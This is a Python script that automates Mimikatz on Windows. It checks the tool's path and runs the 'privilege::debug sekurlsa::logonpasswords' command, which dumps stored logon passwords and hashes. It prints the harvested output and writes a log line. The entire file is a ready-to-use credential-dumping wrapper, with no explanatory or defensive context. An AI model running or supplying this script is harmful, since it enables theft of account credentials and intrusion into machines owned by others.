import os
import subprocess

def check_mimikatz_path(mimikatz_path):
    """Check if Mimikatz exists at the given path."""
    if os.path.exists(mimikatz_path):
        print(f"Mimikatz found at: {mimikatz_path}")
        return True
    else:
        print(f"Mimikatz not found at: {mimikatz_path}")
        return False


def run_mimikatz_command(mimikatz_path, command):
    """Execute a Mimikatz command and return the output."""
    try:
        process = subprocess.run(
            [mimikatz_path, command],
            capture_output=True,
            text=True
        )
        return process.stdout
    except Exception as e:
        print(f"Error running Mimikatz: {e}")
        return None


def log_execution(details):
    """Log script execution for auditing purposes."""
    with open("mimikatz_log.txt", "a") as log_file:
        log_file.write(details + "\n")


def main():
    mimikatz_path = "C:\\Path\\To\\Mimikatz\\mimikatz.exe"  # Update this path

    if not check_mimikatz_path(mimikatz_path):
        print("Exiting: Mimikatz not found.")
        return

    mimikatz_command = "privilege::debug sekurlsa::logonpasswords exit"
    print(f"Executing Mimikatz command: {mimikatz_command}")

    output = run_mimikatz_command(mimikatz_path, mimikatz_command)

    log_execution(f"Executed command: {mimikatz_command}")

    if output:
        print("Mimikatz Output:")
        print(output)
    else:
        print("Failed to execute Mimikatz command.")


if __name__ == "__main__":
    main()